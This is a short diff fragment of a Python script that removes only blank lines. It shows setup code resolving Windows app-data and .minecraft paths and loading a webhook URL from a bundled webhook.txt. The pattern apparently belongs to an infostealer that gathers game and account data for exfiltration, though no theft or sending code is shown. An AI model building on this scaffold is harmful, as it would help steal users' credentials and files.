@@ -14,18 +14,15 @@ import os
 import json
 import sys
 
-
 LOCAL = os.getenv("LOCALAPPDATA")
 TEMP = os.getenv("TEMP")
 ROAMING = os.getenv("APPDATA")
 mcpath = ROAMING + "\\.minecraft"
 
-
 if getattr(sys, 'frozen', False):
     webhookurl = open(file=os.path.join(sys._MEIPASS, "webhook.txt"), mode="r").read().strip()
 else:
     webhookurl = open("webhook.txt", "r").read().strip()
-
 
 PATHS = {
 
